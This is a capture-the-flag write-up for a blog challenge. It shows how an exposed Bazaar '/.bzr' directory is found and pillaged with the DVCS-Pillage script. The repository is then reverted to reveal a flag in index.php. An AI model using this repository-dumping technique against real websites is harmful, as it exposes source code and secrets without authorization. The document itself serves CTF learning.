> recently learned about PHP and I can't stop switching everything over to it. In fact, this bldg is now powered by PHP, I think!! changed the file extension at least, and added a little PHP code below here. That should pretty much do it right? I have the PHP code commented out for now since I cant seem to get it to work right. I'll have to look into it later. 
## Solution:
This blog seems to be written by a beginner making his first steps in the development world. It's a classic beginner's mistake to upload source control files to the web, making them world-accessible. He is using Bazaar (which is similar to git) - and by trying to access known Bazaar files under "/.bzr" we are able to get a successful response.
Now we can use a script like [DVCS-Pillage](https://github.com/evilpacket/DVCS-Pillage) to download the repository:
```console
~/utils/DVCS-Pillage/bzpillage.sh 138.247.13.106
```
We get the following directory structure:
```console
root@kali:/media/sf_CTFs/mitre/blog# tree -al 138.247.13.106/
138.247.13.106/

Let's check out the revision log:
```console
root@kali:/media/sf_CTFs/mitre/blog/138.247.13.106# bzr log
------------------------------------------------------------
revno: 1
committer: BZR Lover
branch nick: filePathTraversalEasy
timestamp: Thu 2018-12-06 13:48:25 -0500
message:
  BZR is so cool!
```
Just one commit, let's take it:
```console
root@kali:/media/sf_CTFs/mitre/blog/138.247.13.106# bzr revert -r 1
  * index.php
```
What does `index.php` contain?
```console
root@kali:/media/sf_CTFs/mitre/blog/138.247.13.106# cat index.php | grep MCA
                // Flag is MCA{canonical_is_literally_my_favorite_company_in_the_whole_world}
```
